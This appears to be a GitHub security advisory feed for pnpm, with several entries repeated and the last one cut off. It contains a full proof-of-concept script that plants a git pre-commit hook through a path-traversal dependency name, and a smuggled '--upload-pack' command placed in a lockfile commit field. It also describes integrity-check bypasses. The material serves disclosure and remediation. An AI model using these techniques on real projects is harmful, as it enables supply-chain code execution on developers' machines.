<h2 id="proof-of-concept">Proof Of Concept</h2>
<p>Run:</p>
<pre><code class="language-sh">./run.sh
</code></pre>
<pre><code class="language-sh">#!/bin/sh
set -eu

SCRIPT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" &amp;&amp; pwd)
WORKDIR="$SCRIPT_DIR/demo-workdir"
REGISTRY_DIR="$WORKDIR/registry"
TARBALLS_DIR="$REGISTRY_DIR/tarballs"
VICTIM_DIR="$WORKDIR/victim"
READY_FILE="$WORKDIR/registry-ready"
PORT_FILE="$WORKDIR/registry-port"

rm -rf "$WORKDIR"
mkdir -p "$REGISTRY_DIR/payload-hooks" "$REGISTRY_DIR/bad" "$REGISTRY_DIR/normal" "$TARBALLS_DIR" "$VICTIM_DIR"

cat &gt; "$REGISTRY_DIR/payload-hooks/package.json" &lt;&lt;'JSON'
{
  "name": "payload-hooks",
  "version": "1.0.0",
  "bin": {
    "pre-commit": "pre-commit"
  },
  "files": [
    "pre-commit"
  ]
}
JSON

cat &gt; "$REGISTRY_DIR/payload-hooks/pre-commit" &lt;&lt;'EOF'
#!/bin/sh
echo PWNED &gt;&amp;2
exit 0
EOF
chmod +x "$REGISTRY_DIR/payload-hooks/pre-commit"

cat &gt; "$REGISTRY_DIR/bad/package.json" &lt;&lt;'JSON'
{
  "name": "bad",
  "version": "1.0.0",
  "description": "transitive registry package",
  "dependencies": {
    "@x/../../../../../.git/hooks": "npm:payload-hooks@1.0.0"
  }
}
JSON

cat &gt; "$REGISTRY_DIR/normal/package.json" &lt;&lt;'JSON'
{
  "name": "normal",
  "version": "1.0.0",
  "description": "normal looking package from a registry",
  "dependencies": {
    "bad": "1.0.0"
  }
}
JSON

(cd "$REGISTRY_DIR/payload-hooks" &amp;&amp; npm pack --pack-destination "$TARBALLS_DIR" --silent &gt;/dev/null)
(cd "$REGISTRY_DIR/bad" &amp;&amp; npm pack --pack-destination "$TARBALLS_DIR" --silent &gt;/dev/null)
(cd "$REGISTRY_DIR/normal" &amp;&amp; npm pack --pack-destination "$TARBALLS_DIR" --silent &gt;/dev/null)

node - "$REGISTRY_DIR" "$READY_FILE" "$PORT_FILE" &lt;&lt;'NODE' &amp;
const http = require('node:http')
const fs = require('node:fs')
const path = require('node:path')
const { execFileSync } = require('node:child_process')

const [registryDir, readyFile, portFile] = process.argv.slice(2)
const tarballsDir = path.join(registryDir, 'tarballs')

function shasum (filename) {
  return execFileSync('openssl', ['dgst', '-sha1', path.join(tarballsDir, filename)])
    .toString()
    .trim()
    .split(/\s+/)
    .pop()
}

function integrity (filename) {
  return 'sha512-' + execFileSync('openssl', ['dgst', '-sha512', '-binary', path.join(tarballsDir, filename)])
    .toString('base64')
}

function packument (pkgName, req) {
  const filename = `${pkgName}-1.0.0.tgz`
  const manifest = JSON.parse(fs.readFileSync(path.join(registryDir, pkgName, 'package.json'), 'utf8'))
  const origin = `http://${req.headers.host}`
  return {
    name: pkgName,
    'dist-tags': {
      latest: '1.0.0',
    },
    versions: {
      '1.0.0': {
        ...manifest,
        dist: {
          tarball: `${origin}/${pkgName}/-/${filename}`,
          shasum: shasum(filename),
          integrity: integrity(filename),
        },
      },
    },
  }
}

const server = http.createServer((req, res) =&gt; {
  const pathname = new URL(req.url, 'http://local.invalid').pathname
  if (req.method !== 'GET') {
    res.writeHead(405)
    res.end('method not allowed')
    return
  }
  if (pathname === '/normal' || pathname === '/bad' || pathname === '/payload-hooks') {
    const pkgName = pathname.slice(1)
    res.writeHead(200, { 'content-type': 'application/json' })
    res.end(JSON.stringify(packument(pkgName, req)))
    return
  }
  const tarballMatch = pathname.match(/^\/(normal|bad|payload-hooks)\/-\/(.+\.tgz)$/)
  if (tarballMatch) {
    const file = path.join(tarballsDir, tarballMatch[2])
    res.writeHead(200, { 'content-type': 'application/octet-stream' })
    fs.createReadStream(file).pipe(res)
    return
  }
  res.writeHead(404)
  res.end('not found')
})

server.listen(0, '127.0.0.1', () =&gt; {
  fs.writeFileSync(portFile, String(server.address().port))
  fs.writeFileSync(readyFile, 'ready')
})
NODE
REGISTRY_PID=$!
trap 'kill "$REGISTRY_PID" 2&gt;/dev/null || true' EXIT INT TERM

WAIT_COUNT=0
while [ ! -f "$READY_FILE" ]; do
  WAIT_COUNT=$((WAIT_COUNT + 1))
  if [ "$WAIT_COUNT" -gt 100 ]; then
    echo "local registry did not start" &gt;&amp;2
    exit 1
  fi
  sleep 0.05
done
REGISTRY_PORT=$(cat "$PORT_FILE")

cd "$VICTIM_DIR"
git init -q
git config user.email demo@example.invalid
git config user.name "Demo User"

cat &gt; package.json &lt;&lt;'JSON'
{
  "name": "victim",
  "version": "1.0.0"
}
JSON

cat &gt; .npmrc &lt;&lt;EOF
registry=http://127.0.0.1:$REGISTRY_PORT/
EOF

printf 'pnpm: '
pnpm --version
printf 'registry: http://127.0.0.1:%s/\n' "$REGISTRY_PORT"
printf 'victim: %s\n\n' "$VICTIM_DIR"

pnpm install normal@1.0.0 --ignore-scripts --config.confirmModulesPurge=false --reporter=silent

echo 'trigger commit' &gt; change.txt
git add change.txt

set +e
COMMIT_STDERR=$(git commit -m 'trigger pre-commit' 2&gt;&amp;1 &gt;/dev/null)
COMMIT_STATUS=$?
set -e

printf '\ngit commit exit code: %s\n' "$COMMIT_STATUS"
printf 'git commit stderr:\n%s\n' "$COMMIT_STDERR"
</code></pre>
<p>The script starts a local npm-compatible registry, writes a victim project <code>.npmrc</code> that points to that registry, installs <code>normal@1.0.0</code> with <code>--ignore-scripts</code>, and then triggers <code>git commit</code>.</p>
<p>Requirements:</p>
<pre><code class="language-text">pnpm
npm
node
git
openssl
</code></pre>
<p>Expected output:</p>
<pre><code class="language-text">git commit exit code: 0
git commit stderr:
PWNED
</code></pre>
<p><code>PWNED</code> is printed by the attacker-controlled <code>pre-commit</code> hook from the <code>payload-hooks</code> package.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-hwx4-2j3j-g496">https://github.com/pnpm/pnpm/security/advisories/GHSA-hwx4-2j3j-g496</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50016">https://nvd.nist.gov/vuln/detail/CVE-2026-50016</a></li>
<li><a href="https://github.com/advisories/GHSA-hwx4-2j3j-g496">https://github.com/advisories/GHSA-hwx4-2j3j-g496</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hwx4-2j3j-g496</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-26T22:55:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: Git Fetch Argument Injection via Lockfile resolution.commit]]></title>
        <id>https://github.com/advisories/GHSA-p4xf-rf54-rj3x</id>
        <link href="https://github.com/advisories/GHSA-p4xf-rf54-rj3x"/>
        <updated>2026-06-26T22:53:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>pnpm passes the lockfile-controlled git <code>resolution.commit</code> value to <code>git fetch</code> without a <code>--</code> separator or commit-format validation. For git dependencies fetched through the shallow-fetch path, a malicious lockfile can replace the expected 40-character commit hash with a Git option such as <code>--upload-pack=&lt;command&gt;</code>. For SSH and local transports, <code>--upload-pack</code> can execute the supplied command. HTTPS transports ignore <code>--upload-pack</code>, so the practical attack surface is primarily SSH or local git dependencies.</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>The vulnerable path is in <code>fetching/git-fetcher/src/index.ts</code>. When a git dependency host is configured for shallow fetching, pnpm calls:</p>
<pre><code class="language-typescript">await execGit(['fetch', '--depth', '1', 'origin', resolution.commit], { cwd: tempLocation })
</code></pre>
<p>Because <code>resolution.commit</code> is appended before a <code>--</code> separator, Git can parse a commit value beginning with <code>-</code> as an option. The same file later passes the value to <code>git checkout</code> without a separator:</p>
<pre><code class="language-typescript">await execGit(['checkout', resolution.commit], { cwd: tempLocation })
</code></pre>
<p><code>resolution.commit</code> comes from the lockfile and is typed as a plain <code>string</code>; pnpm does not validate it as a 40-character hexadecimal commit before passing it to Git.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-bash">bash autofyn_audit/exploits/vuln11_git_upload_pack_rce/exploit.sh
# Creates a local bare git repo and triggers the shallow-fetch path.
# Replaces the lockfile commit hash with '--upload-pack=touch /tmp/vuln11_pwned'.
# Result: PASS -- /tmp/vuln11_pwned created by injected touch command.
</code></pre>
<p>The PoC uses a local <code>file://githost/...</code> repository because the injection requires a local or SSH transport. HTTPS transport ignores <code>--upload-pack</code>.</p>
<h2 id="impact">Impact</h2>
<p>Code execution as the user running <code>pnpm install</code>, under specific transport conditions. The attacker must modify <code>pnpm-lock.yaml</code>, and the affected dependency must use SSH or local git transport. HTTPS transport (the common case) is immune.</p>
<h2 id="suggested-remediation">Suggested Remediation</h2>
<p>Add a <code>--</code> separator before lockfile-controlled git revision values. Validate <code>resolution.commit</code> matches <code>/^[0-9a-f]{40}$/i</code> before passing to Git.</p>
<hr>
<blockquote>
<p>Discovered by <a href="https://github.com/SignalPilot-Labs/AutoFyn">AutoFyn</a>
Full audit report: <a href="https://github.com/tempcollab/pnpm/blob/main/autofyn_audit/audit_report.md">audit_report.md</a>
Exploit script: <a href="https://github.com/tempcollab/pnpm/blob/main/autofyn_audit/exploits/vuln11_git_upload_pack_rce/exploit.sh">exploit.sh</a></p>
</blockquote>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-p4xf-rf54-rj3x">https://github.com/pnpm/pnpm/security/advisories/GHSA-p4xf-rf54-rj3x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50014">https://nvd.nist.gov/vuln/detail/CVE-2026-50014</a></li>
<li><a href="https://github.com/advisories/GHSA-p4xf-rf54-rj3x">https://github.com/advisories/GHSA-p4xf-rf54-rj3x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p4xf-rf54-rj3x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T22:53:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: Git Fetch Argument Injection via Lockfile resolution.commit]]></title>
        <id>https://github.com/advisories/GHSA-p4xf-rf54-rj3x</id>
        <link href="https://github.com/advisories/GHSA-p4xf-rf54-rj3x"/>
        <updated>2026-06-26T22:53:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>pnpm passes the lockfile-controlled git <code>resolution.commit</code> value to <code>git fetch</code> without a <code>--</code> separator or commit-format validation. For git dependencies fetched through the shallow-fetch path, a malicious lockfile can replace the expected 40-character commit hash with a Git option such as <code>--upload-pack=&lt;command&gt;</code>. For SSH and local transports, <code>--upload-pack</code> can execute the supplied command. HTTPS transports ignore <code>--upload-pack</code>, so the practical attack surface is primarily SSH or local git dependencies.</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>The vulnerable path is in <code>fetching/git-fetcher/src/index.ts</code>. When a git dependency host is configured for shallow fetching, pnpm calls:</p>
<pre><code class="language-typescript">await execGit(['fetch', '--depth', '1', 'origin', resolution.commit], { cwd: tempLocation })
</code></pre>
<p>Because <code>resolution.commit</code> is appended before a <code>--</code> separator, Git can parse a commit value beginning with <code>-</code> as an option. The same file later passes the value to <code>git checkout</code> without a separator:</p>
<pre><code class="language-typescript">await execGit(['checkout', resolution.commit], { cwd: tempLocation })
</code></pre>
<p><code>resolution.commit</code> comes from the lockfile and is typed as a plain <code>string</code>; pnpm does not validate it as a 40-character hexadecimal commit before passing it to Git.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-bash">bash autofyn_audit/exploits/vuln11_git_upload_pack_rce/exploit.sh
# Creates a local bare git repo and triggers the shallow-fetch path.
# Replaces the lockfile commit hash with '--upload-pack=touch /tmp/vuln11_pwned'.
# Result: PASS -- /tmp/vuln11_pwned created by injected touch command.
</code></pre>
<p>The PoC uses a local <code>file://githost/...</code> repository because the injection requires a local or SSH transport. HTTPS transport ignores <code>--upload-pack</code>.</p>
<h2 id="impact">Impact</h2>
<p>Code execution as the user running <code>pnpm install</code>, under specific transport conditions. The attacker must modify <code>pnpm-lock.yaml</code>, and the affected dependency must use SSH or local git transport. HTTPS transport (the common case) is immune.</p>
<h2 id="suggested-remediation">Suggested Remediation</h2>
<p>Add a <code>--</code> separator before lockfile-controlled git revision values. Validate <code>resolution.commit</code> matches <code>/^[0-9a-f]{40}$/i</code> before passing to Git.</p>
<hr>
<blockquote>
<p>Discovered by <a href="https://github.com/SignalPilot-Labs/AutoFyn">AutoFyn</a>
Full audit report: <a href="https://github.com/tempcollab/pnpm/blob/main/autofyn_audit/audit_report.md">audit_report.md</a>
Exploit script: <a href="https://github.com/tempcollab/pnpm/blob/main/autofyn_audit/exploits/vuln11_git_upload_pack_rce/exploit.sh">exploit.sh</a></p>
</blockquote>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-p4xf-rf54-rj3x">https://github.com/pnpm/pnpm/security/advisories/GHSA-p4xf-rf54-rj3x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50014">https://nvd.nist.gov/vuln/detail/CVE-2026-50014</a></li>
<li><a href="https://github.com/advisories/GHSA-p4xf-rf54-rj3x">https://github.com/advisories/GHSA-p4xf-rf54-rj3x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p4xf-rf54-rj3x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T22:53:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm Has an Integrity Check Bypass via Missing Lockfile Integrity Field]]></title>
        <id>https://github.com/advisories/GHSA-q6j5-fjx5-2mc3</id>
        <link href="https://github.com/advisories/GHSA-q6j5-fjx5-2mc3"/>
        <updated>2026-06-26T22:53:03.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>pnpm's tarball extraction worker skips integrity verification when the <code>integrity</code> field is absent from the lockfile resolution. If an attacker can both modify <code>pnpm-lock.yaml</code> to remove the <code>integrity:</code> field and cause the referenced registry URL to serve altered package content, <code>pnpm install --frozen-lockfile</code> can install the altered package without an integrity error. npm's <code>npm ci</code> enforces integrity by default; pnpm's behavior of silently skipping verification is a pnpm-specific fail-open gap.</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>The <code>addTarballToStore</code> function in <code>worker/src/start.ts</code> (lines 189-204) checks <code>if (integrity)</code> before verifying the tarball hash. The <code>TarballResolution</code> type declares <code>integrity</code> as optional (<code>integrity?: string</code>). When the lockfile omits the <code>integrity</code> field, the guard evaluates to <code>false</code>, skipping hash verification entirely. The worker then computes a new hash from the unverified content and stores it as legitimate.</p>
<pre><code class="language-typescript">// worker/src/start.ts:189-204
function addTarballToStore ({ buffer, storeDir, integrity, ... }: TarballExtractMessage) {
  if (integrity) {           // false when integrity is undefined
    const { algorithm, hexDigest } = parseIntegrity(integrity)
    const calculatedHash = crypto.hash(algorithm, buffer, 'hex')
    if (calculatedHash !== hexDigest) {
      return { status: 'error', error: { type: 'integrity_validation_failed', ... } }
    }
  }
  return {
    status: 'success',
    value: { integrity: integrity ?? calcIntegrity(buffer) },
  }
}
</code></pre>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-bash">bash autofyn_audit/exploits/vuln1_integrity_bypass/exploit.sh
# Publishes a package, generates lockfile, republishes tampered version,
# strips integrity field, re-runs install --frozen-lockfile.
# Result: PASS -- tampered package installed without integrity error.
</code></pre>
<h2 id="impact">Impact</h2>
<p>Supply chain compromise in environments where an attacker can both alter the lockfile and cause the referenced registry URL to serve altered package content. The <code>--frozen-lockfile</code> flag does not fail closed when the integrity field is missing.</p>
<h2 id="suggested-remediation">Suggested Remediation</h2>
<p>Require an <code>integrity</code> field for remote tarball resolutions. Change the <code>if (integrity)</code> guard to fail when integrity is absent for non-local packages. When <code>--frozen-lockfile</code> is active, reject lockfile entries that lack integrity for remote packages.</p>
<hr>
<blockquote>
<p>Discovered by <a href="https://github.com/SignalPilot-Labs/AutoFyn">AutoFyn</a>
Full audit report: <a href="https://github.com/tempcollab/pnpm/blob/main/autofyn_audit/audit_report.md">audit_report.md</a>
Exploit script: <a href="https://github.com/tempcollab/pnpm/blob/main/autofyn_audit/exploits/vuln1_integrity_bypass/exploit.sh">exploit.sh</a></p>
</blockquote>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-q6j5-fjx5-2mc3">https://github.com/pnpm/pnpm/security/advisories/GHSA-q6j5-fjx5-2mc3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50021">https://nvd.nist.gov/vuln/detail/CVE-2026-50021</a></li>
<li><a href="https://github.com/advisories/GHSA-q6j5-fjx5-2mc3">https://github.com/advisories/GHSA-q6j5-fjx5-2mc3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q6j5-fjx5-2mc3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T22:53:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm Has an Integrity Check Bypass via Missing Lockfile Integrity Field]]></title>
        <id>https://github.com/advisories/GHSA-q6j5-fjx5-2mc3</id>
        <link href="https://github.com/advisories/GHSA-q6j5-fjx5-2mc3"/>
        <updated>2026-06-26T22:53:03.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>pnpm's tarball extraction worker skips integrity verification when the <code>integrity</code> field is absent from the lockfile resolution. If an attacker can both modify <code>pnpm-lock.yaml</code> to remove the <code>integrity:</code> field and cause the referenced registry URL to serve altered package content, <code>pnpm install --frozen-lockfile</code> can install the altered package without an integrity error. npm's <code>npm ci</code> enforces integrity by default; pnpm's behavior of silently skipping verification is a pnpm-specific fail-open gap.</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>The <code>addTarballToStore</code> function in <code>worker/src/start.ts</code> (lines 189-204) checks <code>if (integrity)</code> before verifying the tarball hash. The <code>TarballResolution</code> type declares <code>integrity</code> as optional (<code>integrity?: string</code>). When the lockfile omits the <code>integrity</code> field, the guard evaluates to <code>false</code>, skipping hash verification entirely. The worker then computes a new hash from the unverified content and stores it as legitimate.</p>
<pre><code class="language-typescript">// worker/src/start.ts:189-204
function addTarballToStore ({ buffer, storeDir, integrity, ... }: TarballExtractMessage) {
  if (integrity) {           // false when integrity is undefined
    const { algorithm, hexDigest } = parseIntegrity(integrity)
    const calculatedHash = crypto.hash(algorithm, buffer, 'hex')
    if (calculatedHash !== hexDigest) {
      return { status: 'error', error: { type: 'integrity_validation_failed', ... } }
    }
  }
  return {
    status: 'success',
    value: { integrity: integrity ?? calcIntegrity(buffer) },
  }
}
</code></pre>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-bash">bash autofyn_audit/exploits/vuln1_integrity_bypass/exploit.sh
# Publishes a package, generates lockfile, republishes tampered version,
# strips integrity field, re-runs install --frozen-lockfile.
# Result: PASS -- tampered package installed without integrity error.
</code></pre>
<h2 id="impact">Impact</h2>
<p>Supply chain compromise in environments where an attacker can both alter the lockfile and cause the referenced registry URL to serve altered package content. The <code>--frozen-lockfile</code> flag does not fail closed when the integrity field is missing.</p>
<h2 id="suggested-remediation">Suggested Remediation</h2>
<p>Require an <code>integrity</code> field for remote tarball resolutions. Change the <code>if (integrity)</code> guard to fail when integrity is absent for non-local packages. When <code>--frozen-lockfile</code> is active, reject lockfile entries that lack integrity for remote packages.</p>
<hr>
<blockquote>
<p>Discovered by <a href="https://github.com/SignalPilot-Labs/AutoFyn">AutoFyn</a>
Full audit report: <a href="https://github.com/tempcollab/pnpm/blob/main/autofyn_audit/audit_report.md">audit_report.md</a>
Exploit script: <a href="https://github.com/tempcollab/pnpm/blob/main/autofyn_audit/exploits/vuln1_integrity_bypass/exploit.sh">exploit.sh</a></p>
</blockquote>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-q6j5-fjx5-2mc3">https://github.com/pnpm/pnpm/security/advisories/GHSA-q6j5-fjx5-2mc3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50021">https://nvd.nist.gov/vuln/detail/CVE-2026-50021</a></li>
<li><a href="https://github.com/advisories/GHSA-q6j5-fjx5-2mc3">https://github.com/advisories/GHSA-q6j5-fjx5-2mc3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q6j5-fjx5-2mc3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T22:53:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: Unsafe default behavior breaks integrity check]]></title>
        <id>https://github.com/advisories/GHSA-54hh-g5mx-jqcp</id>
        <link href="https://github.com/advisories/GHSA-54hh-g5mx-jqcp"/>
        <updated>2026-06-26T22:52:34.000Z</updated>
        <content type="html"><![CDATA[<p>While it is unclear whether this should be classified as a vulnerability, it is being reported through this channel because the current behavior may represent an unsafe default.</p>
<h2 id="summary">Summary</h2>
<p><code>pnpm install</code> in non-frozen mode can accept new remote package content after detecting that the downloaded tarball does not match the integrity recorded in <code>pnpm-lock.yaml</code>.</p>
<p>When a package is already locked with an <code>integrity</code> value, and the registry later serves different metadata and tarball content for the same package name and version, pnpm initially reports an integrity mismatch. However, plain <code>pnpm install</code> then performs a resolution repair, accepts the registry's new integrity, updates the lockfile, installs the new content, and exits successfully.</p>
<p>This means the lockfile integrity check does not act as a hard stop by default.</p>
<h2 id="reproduction-scenario">Reproduction Scenario</h2>
<ol>
<li>Run a local npm-compatible registry.</li>
<li>Publish or serve <code>example-package@1.0.0</code> with tarball content <code>v1</code>.</li>
<li>Install it with pnpm:</li>
</ol>
<pre><code class="language-bash">pnpm add example-package@1.0.0 --registry=http://127.0.0.1:48741
</code></pre>
<ol start="4">
<li>Confirm <code>pnpm-lock.yaml</code> contains the <code>v1</code> integrity:</li>
</ol>
<pre><code class="language-yaml">packages:
  example-package@1.0.0:
    resolution:
      integrity: sha512-...v1...
</code></pre>
<ol start="5">
<li>Change the registry metadata and tarball for the same <code>example-package@1.0.0</code> to content <code>v2</code>.</li>
<li>On a clean store/cache, run:</li>
</ol>
<pre><code class="language-bash">pnpm install --registry=http://127.0.0.1:48741
</code></pre>
<h2 id="observed-behavior">Observed Behavior</h2>
<p>pnpm detects the checksum mismatch:</p>
<pre><code class="language-text">WARN Got unexpected checksum for "http://127.0.0.1:48741/example-package/-/example-package-1.0.0.tgz".
Wanted "sha512-...v1..."
Got "sha512-...v2...".

ERR_PNPM_TARBALL_INTEGRITY The lockfile is broken! Resolution step will be performed to fix it.
</code></pre>
<p>However, the install still succeeds:</p>
<pre><code class="language-text">INSTALL_RC=0
INSTALLED=v2-replaced
</code></pre>
<p>The lockfile is then rewritten to trust the new remote integrity:</p>
<pre><code class="language-yaml">packages:
  example-package@1.0.0:
    resolution:
      integrity: sha512-...v2...
</code></pre>
<h2 id="expected-behavior">Expected Behavior</h2>
<p>If a downloaded tarball does not match the integrity recorded in <code>pnpm-lock.yaml</code>, the install should fail by default.</p>
<p>The lockfile integrity should be treated as authoritative unless the user explicitly requests lockfile repair or dependency update behavior.</p>
<h2 id="security-impact">Security Impact</h2>
<p>This behavior weakens the protection normally expected from a committed lockfile.</p>
<p>If a registry is compromised and an attacker overwrites the metadata and tarball for an existing package version, a new environment without the old pnpm store/cache may install the attacker's replacement package even though the project already has a lockfile with the original integrity.</p>
<p>Examples of affected new or clean environments include:</p>
<ul>
<li>an engineer setting up the project on a new machine</li>
<li>a new team member onboarding to the project</li>
</ul>
<p>In this situation, pnpm first detects that the downloaded tarball does not match the integrity stored in <code>pnpm-lock.yaml</code>. However, instead of failing by default, plain <code>pnpm install</code> performs a resolution repair, trusts the current remote registry metadata, updates the lockfile to the new integrity, and installs the new registry content.</p>
<p>In other words, when the lockfile and registry disagree, the default non-frozen behavior can end up trusting the remote registry over the content previously recorded in the lockfile.</p>
<p>This is especially relevant for:</p>
<ul>
<li>private registries that allow overwriting or republishing the same version</li>
<li>registry mirrors or proxies that can serve changed metadata and tarballs</li>
<li>compromised public or private registries</li>
<li>compromised registry proxy infrastructure</li>
</ul>
<p>The behavior is also surprising because the command reports an integrity error but still exits successfully after resolution repair.</p>
<p>This issue does not occur when <code>--frozen-lockfile</code> is enabled. In frozen mode, the same integrity mismatch fails the install and does not install the changed package content.</p>
<p>However, since the lockfile already records an integrity value, the integrity for the same package version should normally not change. If it does change, one likely explanation is that the server or registry has been compromised or is serving mutated package content. Under normal package publishing workflows, changed package content should be published as a new version instead of replacing an existing version.</p>
<p>For that reason, it may be safer for pnpm's default behavior to be closer to frozen mode for this specific case. At minimum, pnpm should not automatically repair the lockfile and trust the registry after an integrity mismatch. It should fail and let the user explicitly decide whether to discard the locked integrity, re-resolve the package from the remote registry, and update the lockfile.</p>
<h2 id="comparison">Comparison</h2>
<p>In the same scenario, <code>npm install</code> with an existing <code>package-lock.json</code> fails with <code>EINTEGRITY</code> and does not install the changed tarball.</p>
<p><code>pnpm install --frozen-lockfile</code> also fails as expected:</p>
<pre><code class="language-text">ERR_PNPM_TARBALL_INTEGRITY
</code></pre>
<p>The issue is specific to the default non-frozen behavior of plain <code>pnpm install</code> in non-CI environment.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-54hh-g5mx-jqcp">https://github.com/pnpm/pnpm/security/advisories/GHSA-54hh-g5mx-jqcp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50573">https://nvd.nist.gov/vuln/detail/CVE-2026-50573</a></li>
<li><a href="https://github.com/advisories/GHSA-54hh-g5mx-jqcp">https://github.com/advisories/GHSA-54hh-g5mx-jqcp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-54hh-g5mx-jqcp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T22:52:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: Unsafe default behavior breaks integrity check]]></title>
        <id>https://github.com/advisories/GHSA-54hh-g5mx-jqcp</id>
        <link href="https://github.com/advisories/GHSA-54hh-g5mx-jqcp"/>
        <updated>2026-06-26T22:52:34.000Z</updated>
        <content type="html"><![CDATA[<p>While it is unclear whether this should be classified as a vulnerability, it is being reported through this channel because the current behavior may represent an unsafe default.</p>
<h2 id="summary">Summary</h2>
<p><code>pnpm install</code> in non-frozen mode can accept new remote package content after detecting that the downloaded tarball does not match the integrity recorded in <code>pnpm-lock.yaml</code>.</p>
<p>When a package is already locked with an <code>integrity</code> value, and the registry later serves different metadata and tarball content for the same package name and version, pnpm initially reports an integrity mismatch. However, plain <code>pnpm install</code> then performs a resolution repair, accepts the registry's new integrity, updates the lockfile, installs the new content, and exits successfully.</p>
<p>This means the lockfile integrity check does not act as a hard stop by default.</p>
<h2 id="reproduction-scenario">Reproduction Scenario</h2>
<ol>
<li>Run a local npm-compatible registry.</li>
<li>Publish or serve <code>example-package@1.0.0</code> with tarball content <code>v1</code>.</li>
<li>Install it with pnpm:</li>
</ol>
<pre><code class="language-bash">pnpm add example-package@1.0.0 --registry=http://127.0.0.1:48741
</code></pre>
<ol start="4">
<li>Confirm <code>pnpm-lock.yaml</code> contains the <code>v1</code> integrity:</li>
</ol>
<pre><code class="language-yaml">packages:
  example-package@1.0.0:
    resolution:
      integrity: sha512-...v1...
</code></pre>
<ol start="5">
<li>Change the registry metadata and tarball for the same <code>example-package@1.0.0</code> to content <code>v2</code>.</li>
<li>On a clean store/cache, run:</li>
</ol>
<pre><code class="language-bash">pnpm install --registry=http://127.0.0.1:48741
</code></pre>
<h2 id="observed-behavior">Observed Behavior</h2>
<p>pnpm detects the checksum mismatch:</p>
<pre><code class="language-text">WARN Got unexpected checksum for "http://127.0.0.1:48741/example-package/-/example-package-1.0.0.tgz".
Wanted "sha512-...v1..."
Got "sha512-...v2...".

ERR_PNPM_TARBALL_INTEGRITY The lockfile is broken! Resolution step will be performed to fix it.
</code></pre>
<p>However, the install still succeeds:</p>
<pre><code class="language-text">INSTALL_RC=0
INSTALLED=v2-replaced
</code></pre>
<p>The lockfile is then rewritten to trust the new remote integrity:</p>
<pre><code class="language-yaml">packages:
  example-package@1.0.0:
    resolution:
      integrity: sha512-...v2...
</code></pre>
<h2 id="expected-behavior">Expected Behavior</h2>
<p>If a downloaded tarball does not match the integrity recorded in <code>pnpm-lock.yaml</code>, the install should fail by default.</p>
<p>The lockfile integrity should be treated as authoritative unless the user explicitly requests lockfile repair or dependency update behavior.</p>
<h2 id="security-impact">Security Impact</h2>
<p>This behavior weakens the protection normally expected from a committed lockfile.</p>
<p>If a registry is compromised and an attacker overwrites the metadata and tarball for an existing package version, a new environment without the old pnpm store/cache may install the attacker's replacement package even though the project already has a lockfile with the original integrity.</p>
<p>Examples of affected new or clean environments include:</p>
<ul>
<li>an engineer setting up the project on a new machine</li>
<li>a new team member onboarding to the project</li>
</ul>
